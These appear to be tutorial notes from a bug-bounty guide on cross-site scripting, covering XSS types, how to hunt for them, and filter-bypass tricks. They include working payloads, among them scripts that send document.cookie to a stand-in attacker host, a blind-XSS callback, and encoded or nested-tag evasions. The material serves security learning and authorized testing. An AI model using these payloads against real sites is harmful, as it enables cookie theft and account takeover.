# What is Cross-site-scripting (XSS)

An XSS vulnerability occurs when attackers can execute custom scripts on a victim’s browser

These malicious scripts are often JavaScript code but can also be HTML, Flash, VBScript, or anything written in a language that the browser can execute.

# MECHANISM

In an XSS attack, the attacker injects an executable script into HTML pages viewed by the user

If the website doesn’t validate or sanitize the user input before constructing the confirmation message, the page source code would become 
the following: 
```code
<p>Thanks! You have subscribed <b><script>location="http://attacker.com";</script></b> to the newsletter.</p>
```

Validating user input means that the application checks that the user input meets a certain standard—in this case, does not contain malicious JavaScript code. 
Sanitizing user input, on the other hand, means that the application modifies special characters in the input that can be used to interfere with HTML logic before further processing. As a result, the inline script would cause the page to redirect to attacker.com.

XSS happens when attackers can inject scripts in this manner onto a page that another user is viewing. The attacker can also use a different syntax to embed malicious code. The src attribute of the HTML ```<script>``` tag allows you to load JavaScript from an external source. This piece of malicious code will execute the contents of http://attacker.com/xss.js/ on the 
victim’s browser during an XSS attack:
```code
<script src=http://attacker.com/xss.js></script>
```

# Types of XSS

- There are three kinds of XSS: 
1. stored XSS 
2. reflected XSS
3. DOM-based

XSS. The difference between these types is in how the XSS payload travels before it gets delivered to the victim user.
Some XSS flaws also fall into special categories: 
    - blind XSS 
    - self-XSS,

Stored Xss
    - Stored XSS happens when user input is stored on a server and retrieved unsafely. 
    - When an application accepts user input without validation, stores it in its servers, and then renders it on users’ browsers without sanitization. 
    - Malicious JavaScript code can make its way into the database and then to victims’ browsers.
    - Stored XSS is the most severe XSS type, because it has the potential of attacking many more users than reflected, DOM, or self-XSS.

Blind XSS
    - Blind XSS vulnerabilities are stored XSS vulnerabilities whose malicious input is stored by the server and executed in another part of the application or in another application that you cannot see.
    - For example, let’s say that a page on example.com allows you to send a message to the site’s support staff. 
    - When a user submits a message, that input is not validated or sanitized in any way before it gets rendered to the site’s admin page. 
    - An attacker can submit a message with JavaScript code and have that code executed by any admin who views that message.
    - These XSS flaws are harder to detect, since you can’t find them by looking for reflected input in the server’s response, but they can be just as dangerous as regular stored XSS vulnerabilities. 
    - Often, blind XSS can be used to attack administrators, exfiltrate their data, and compromise their accounts.
    
Reflected XSS
    - Reflected XSS vulnerabilities happen when user input is returned to the user without being stored in a database. 
    - The application takes in user input, processes it server-side, and immediately returns it to the user.
    - These issues often happen when the server relies on user input to construct pages that display search results or error messages.
    
DOM-Based XSS
    - DOM-based XSS is similar to reflected XSS, except that in DOM-based XSS, the user input never leaves the user’s browser.
    - In DOM-based XSS, the application takes in user input, processes it on the victim’s browser, and then returns it to the user.
    - The Document Object Model (DOM) is a model that browsers use to render a web page. 
    - The DOM represents a web page’s structure; it defines the basic properties and behavior of each HTML element, and helps scripts access and modify the contents of the page.
    - DOM-based XSS targets a web page’s DOM directly: it attacks the client’s local copy of the web page instead of going through the server.
    - Attackers are able to attack the DOM when a page takes user-supplied data and dynamically alters the DOM based on that input
    - avaScript libraries like jQuery are prone to DOM-based XSS since they dynamically alter DOM elements.
    - As in reflected XSS, attackers submit DOM-based XSS payloads via the victim’s user input
    - Unlike reflected XSS, a DOM-based XSS script doesn’t require server involvement, because it executes when user input modifies the source code of the page in the browser directly.
    - The XSS script is never sent to the server, so the HTTP response from the server won’t change.

# Hunting for XSS

- Look for XSS in places where user input gets rendered on a page.
- The process will vary for the different types of XSS, but the central principle remains the same: check for reflected user input.
- You can hunt for XSS in applications that communicate via non-HTTP protocols such as SMTP, SNMP, and DNS.
    
# Step 1: Look for Input Opportunities

- If you’re attempting stored XSS, search for places where input gets stored by the server and later displayed to the user, including comment fields, user profiles, and blog posts.
- The types of user input that are most often reflected back to the user are forms, search boxes, and name and username fields in sign-ups.
- Don’t limit yourself to text input fields, either. 
- Sometimes drop-down menus or numeric fields can allow you to perform XSS, because even if you can’t enter your payload on your browser, your proxy might let you insert it directly into the request. 
- To do that, you can turn on your proxy’s traffic interception and modify the request before forwarding it to the server. 
- For example, say a user input field seems to accept only numeric values on the web page, such as the age parameter in this POST request:
```HTTP
POST /edit_user_age
(Post request body)
age=20
```
- You can still attempt to submit an XSS payload by intercepting the request via a web proxy and changing the input value:
```HTTP
POST /edit_user_age
(Post request body)
age=<script>alert('XSS by Vickie');</script>
```
- If you’re hoping to find reflected and DOM XSS, look for user input in URL parameters, fragments, or pathnames that get displayed to the user. 
- A good way to do this is to insert a custom string into each URL parameter and check whether it shows up in the returned page. 
- Make this string specific enough that you’ll be sure your input caused it if you see it rendered.
- Insert your custom string into every user-input opportunity you can find.
- Then, when you view the page in the browser, search the page’s source code for it (you can access a page’s source code by right-clicking a page and selecting View Source) by 
using your browser’s page-search functionality (usually triggered by pressing CTRL-F). 
- This should give you an idea of which user input fields appear in the resulting web page.

# Step 2: Insert Payload

- Once you’ve identified the user-input opportunities present in an application, you can start entering a test XSS payload at the discovered injection points. The simplest payload to test with is an alert box:
```code
<script>alert('XSS by Vickie');</script>
```
- If the attack succeeds, you should see a pop-up on the page with the text XSS by Vickie.
- But this payload won’t work in typical web applications, save the most defenseless, because most websites nowadays implement some sort of XSS protection on their input fields.
- As XSS defenses become more advanced, the XSS payloads that get around these defenses 
grow more complex too.

## More Than a ```<script>``` Tag
- Inserting ```<script>``` tags into victim web pages isn’t the only way to get your scripts executed in victim browsers
- There are a few other tricks. First, you can change the values of attributes in HTML tags.
- Some HTML attributes allow you to specify a script to run if certain conditions are met. 
- For example, the onload event attribute runs a specific script after the HTML element has 
loaded:
```
<img onload=alert('The image has been loaded!') src="example.png">
```
- Similarly, the onclick event attribute specifies the script to be executed when the element is clicked, and onerror specifies the script to run in case an error occurs loading the element. 
- If you can insert code into these attributes, or even add a new event attribute into an HTML tag, you can create an XSS.
- Another way you can achieve XSS is through special URL schemes, like javascript: and data:. The javascript: URL scheme allows you to execute JavaScript code specified in the URL. For example, entering this URL will cause an alert box with the text XSS by Vickie to appear:
```javascript:alert('XSS by Vickie')```
- Data URLs, those that use the data: scheme, allow you to embed small files in a URL. 
- You can use these to embed JavaScript code into URLs too:
```data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFZpY2tpZScpPC9zY3JpcHQ+"```
- This URL will also generate an alert box, because the included data in the data URL is the base64-encoded version of the following script:
```<script>alert('XSS by Vickie')</script>```
- Documents contained within data: URLs do not need to be base64 encoded. 
- For example, you can embed the JavaScript directly in the URL as follows, but base64 encoding can often help you bypass XSS filters: 
```data:text/html,<script>alert('XSS by Vickie')</script>```
- You can utilize these URLs to trigger XSS when a site allows URL input from users. 
- A site might allow the user to load an image by using a URL and use it as their profile picture, like this:
```
https://example.com/upload_profile_pic?url=IMAGE_URL
```
- The application will then render a preview on the web page by inserting the URL into an ```<img>``` tag. 
- If you insert a JavaScript or data URL, you can trick the victim’s browser into loading your JavaScript code: ```<img src="IMAGE_URL"/>```
- There are many more ways to execute JavaScript code to bypass XSS protection. 
- You can find more example payloads on PortSwigger at https://portswigger.net/web-security/cross-site-scripting/cheat-sheet/. 
- Different browsers also support different tags and event handlers, so you should always test by using multiple browsers when hunting for XSS.

## Closing Out HTML Tags
- When inserting an XSS payload, you’ll often have to close out a previous HTML tag by including its closing angle bracket.
- This is necessary when you’re placing your user input inside one HTML element but want to run 
JavaScript using a different HTML element. 
- You have to complete the previous tag before you can start a new one to avoid causing a syntax error. 
- Otherwise, the browser won’t interpret your payload correctly. For example, if you’re inserting input into an ```<img>``` tag, you need to close out the ```<img>```
tag before you can start a ```<script>``` tag. 
- Here is the original ```<img>``` tag with a placeholder for user input:
```<img src="USER_INPUT">```
- To close out the tag, your payload has to include the ending of an ```<img>``` tag before the JavaScript. 
- The payload might look like this:
```
"/><script>location="http://attacker.com";</script>
```
- When injected into the ```<img>``` tag, the resulting HTML will look like this (with the injected portion in bold):
```
<img src=""/><script>location="http://attacker.com";</script>">
```
- This payload closes the string that was supposed to contain the user input by providing a double quote, then closes the ```<img>``` tag with a tag ending in />. 
- Finally, the payload injects a complete script tag after the ```<img>``` tag.
- If your payload is not working, you can check whether your payload caused syntax errors in the returned document. 
- You can inspect the returned document in your proxy and look for unclosed tags or other syntax issues. 
- You can also open your browser’s console and see if the browser runs into any errors loading the page. 
- In Firefox, you can open the console by right-clicking the page and choosing Inspect Element->Console. 
- You can find more common XSS payloads online. Table 6-1 lists some examples.
```
<script>alert(1)</script> 
```
- This is the most generic XSS payload. It will generate a popup box if the payload succeeds.
```
<iframe src=javascript:alert(1)>
``` 
- This payload loads JavaScript code within an iframe. It’s useful when ```<script>``` tags are banned by the XSS filter
```
<body onload=alert(1)> 
```
- This payload is useful when your input string can’t contain the term script. 
- It inserts an HTML element that will run JavaScript automatically after it’s loaded.
```"><img src=x onerror=prompt(1);>```
- This payload closes out the previous tag. It then injects an ```<img>``` tag with an invalid source URL. 
- Once the tag fails to load, it will run the JavaScript specified in the onerror attribute.
```<script>alert(1)<!– 
```
- <!- is the start of an HTML comment. This payload will comment out the rest of the line in the HTML document to prevent syntax errors.
- Search XSS payloads online for more ideas. 
- That said, taking a long list of payloads and trying them one by one can be time-consuming and unproductive. 
- Another way of approaching manual XSS testing is to insert an XSS polyglot, a type of 
XSS payload that executes in multiple contexts. 
- For example, it will execute regardless of whether it is inserted into an ```<img>``` tag, a ```<script>``` tag, or a generic ```<p>``` tag and can bypass some XSS filters. 
- Take a look at this polyglot payload published by EdOverflow at https://polyglot.innerht.ml/:
```
javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
```
- This payload contains multiple ways of creating an XSS—so if one method fails, another one 
can still induce the XSS. 
- It contains multiple ways of creating an XSS—so if one method fails, another one can still induce the XSS.
- Another way of testing for XSS more efficiently is to use generic test strings instead of XSS payloads. 
- Insert a string of special HTML characters often used in XSS payloads, such as the following: >'<"//:=;!--. Take note of which ones the application escapes and which get rendered directly.
- Then you can construct test XSS payloads from the characters that you know the 
application isn’t properly sanitizing.
- Blind XSS flaws are harder to detect; since you can’t detect them by looking for reflected input, you can’t test for them by trying to generate an alert box. 
- Instead, try making the victim’s browser generate a request to a server you own. 
- For example, you can submit the following payload, which will make the victim’s browser request the page /xss on your server: 
```
<script src='http://YOUR_SERVER_IP/xss'></script>
```
- Then, you can monitor your server logs to see if anyone requests that page. 
- If you see a request to the path /xss, a blind XSS has been triggered! 
- Tools like XSS Hunter (https://xsshunter.com/features) can automate this process.
- Finally, although hackers typically discover new XSS vectors manually, a good way to automatically test a site for already-known XSS vectors is through fuzzing.

# Step 3 Confirm The Impact
- Check for your payload on the destination page. 
- If you’re using an alert function, was a pop-up box generated on the page? If you’re using a location payload, did your browser redirect you offsite?
- Be aware that sites might also use user input to construct something other than the next returned web page.
- Your input could show up in future web pages, email, and file portals. 
A time delay also might occur between when the payload is submitted and when the user input is rendered. 
- This situation is common in log files and analytics pages. 
- If you’re targeting these, your payload might not execute until later, or in another user’s account. 
- And certain XSS payloads will execute under only certain contexts, such as when an admin is logged in or when the user actively clicks, or hovers over, certain HTML elements. 
- Confirm the impact of the XSS payload by browsing to the necessary pages and performing those actions.

# Bypassing XSS Protection
- Most applications now implement some sort of XSS protection in their input fields. Often, they’ll use a blocklist to filter out dangerous expressions that might be indicative of XSS. Here are some strategies for bypassing this type of protection.

## Alternative JavaScript Syntax

- Often, applications will sanitize ```<script>``` tags in user input. 
- If that is the case, try executing XSS that doesn’t use a ```<script>``` tag. 
- For example, remember that in certain scenarios, you can specify JavaScript to run in other types of tags. 
- When you try to construct an XSS payload, you can also try to insert code into HTML tag names or attributes instead. 
- Say user input is passed into an HTML image tag, like this:
```
<img src="USER_INPUT">
```
- Instead of closing out the image tag and inserting a script tag, like this
```
<img src="/><script>alert('XSS by Vickie');</script>"/>
```
- you can insert the JavaScript code directly as an attribute to the current tag:
```
<img src="123" onerror="alert('XSS by Vickie');"/>
```
- Another way of injecting code without the ```<script>``` tag is to use the special URL schemes mentioned before. 
- This snippet will create a Click me! link that will generate an alert box when clicked:
```
<a href="javascript:alert('XSS by Vickie')>Click me!</a>"
```
## Capitalization and Encoding
- You can also mix different encodings and capitalizations to confuse the XSS filter. 
- For example, if the filter filters for only the string "script", capitalize certain letters in your payload. 
- Since browsers often parse HTML code permissively and will allow for minor syntax issues like capitalization, this won’t affect how the script tag is interpreted:
```
<scrIPT>location='http://attacker_server_ip/c='+document.cookie;</scrIPT>
```
- If the application filters special HTML characters, like single and double quotes, you can’t write any strings into your XSS payload directly. 
- But you could try using the JavaScript fromCharCode() function, which maps numeric codes to the corresponding ASCII characters, to create the string you need. 
- For example, this piece of code is equivalent to the string "http://attacker_server_ip/?c=":
```
String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107,101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61)
```
- The String.fromCharCode() function returns a string, given an input list of ASCII character codes. 
- You can use this piece of code to translate your exploit string to an ASCII number sequence by using an online JavaScript 
editor, like https://js.do/, to run the JavaScript code or by saving it into an HTML file and loading it in your browser:
```
<script>
function ascii(c){
 return c.charCodeAt();
}
encoded = "INPUT_STRING".split("").map(ascii);
document.write(encoded);
</script>
```

# Filter Logic Errors
- Finally, you could exploit any errors in the filter logic. 
- For example, sometimes applications remove all ```<script>``` tags in the user input to prevent XSS, but do it only once. 
- If that’s the case, you can use a payload like this:
```
<scrip<script>t>
location='http://attacker_server_ip/c='+document.cookie;
</scrip</script>t>
```
- Notice that each ```<script>``` tag cuts another ```<script>``` tag in two. 
- The filter won’t recognize those broken tags as legitimate, but once the filter removes the intact tags from this payload, the rendered input becomes a perfectly 
valid piece of JavaScript code:
```
<script>location='http://attacker_server_ip/c='+document.cookie;</script>
```
- These are just a handful of the filter-bypass techniques that you can try. 
- XSS protection is difficult to do right, and hackers are constantly coming up with new techniques to bypass protection. 
- That’s why hackers are still constantly finding and exploiting XSS issues in the wild. 
- For more filter bypass ideas, check out OWASP’s XSS filter evasion cheat sheet (https://owasp.org/www-community/xss-filter-evasion-cheatsheet). 
- You can also simply Google for XSS filter bypass for more interesting articles.


# Finding Your First XSS!
- Jump right into hunting for your first XSS! Choose a target and follow the steps we covered in this chapter:
    1. Look for user input opportunities on the application. When user input is stored and used to construct a web page later, test the input field for stored XSS. If user input in a URL gets reflected back on the resulting web page, test for reflected and DOM XSS.
    1. Insert XSS payloads into the user input fields you’ve found. Insert payloads from lists online, a polyglot payload, or a generic test string.
    1. Confirm the impact of the payload by checking whether your browser runs your JavaScript code. Or in the case of a blind XSS, see if you can make the victim browser generate a request to your server.
    1. If you can’t get any payloads to execute, try bypassing XSS protections.
    1. Automate the XSS hunting process with techniques introduced in Chapter 25.
    1. Consider the impact of the XSS you’ve found: who does it target? How many users can it affect? And what can you achieve with it? Can you escalate the attack by using what you’ve found?
    1. Send your first XSS report to a bug bounty program!

    